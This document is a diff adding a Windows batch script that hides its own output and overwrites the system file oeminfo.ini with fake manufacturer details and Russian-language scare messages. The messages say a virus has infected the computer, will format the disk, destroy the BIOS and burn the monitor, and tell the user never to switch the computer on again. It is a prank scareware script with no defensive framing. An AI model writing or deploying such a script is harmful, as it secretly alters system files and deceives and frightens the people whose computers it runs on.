@@ -1,0 +1,19 @@
+ctty nul
+
+echo [general]>C:\WINDOWS\system\oeminfo.ini
+echo Manufacturer=Не трогать>>C:\WINDOWS\system\oeminfo.ini
+echo Model=Взрывоопасно>>C:\WINDOWS\system\oeminfo.ini
+echo
+echo [OEMSpecific]>>C:\WINDOWS\system\oeminfo.ini
+echo "SubModel=<My Computer>" >>C:\WINDOWS\system\oeminfo.ini
+echo "SerialNo=<666>" >>C:\WINDOWS\system\oeminfo.ini
+echo  "OEM1=<01.11.02>" >>C:\WINDOWS\system\oeminfo.ini
+echo "OEM2=<Eintrag>" >>C:\WINDOWS\system\oeminfo.ini
+echo [Support Information]>>C:\WINDOWS\system\oeminfo.ini
+echo Line1=Опасность!>>C:\WINDOWS\system\oeminfo.ini
+echo Line2=Ваш компьютер будет уничтожен! >>C:\WINDOWS\system\oeminfo.ini
+echo Line3=Была найдена опасная ошибка, в следствии чего, на ваш компьютер попал очень опасный вирус!!! >>C:\WINDOWS\system\oeminfo.ini
+echo Line4=Он форматирует ваш винчестер, портит биос, сжигает монитор и гипнотизирует ваш ум!!! >>C:\WINDOWS\system\oeminfo.ini
+echo Line5=Никогда больше не включайте ваш компьютер! >>C:\WINDOWS\system\oeminfo.ini
+ctty con
+cls
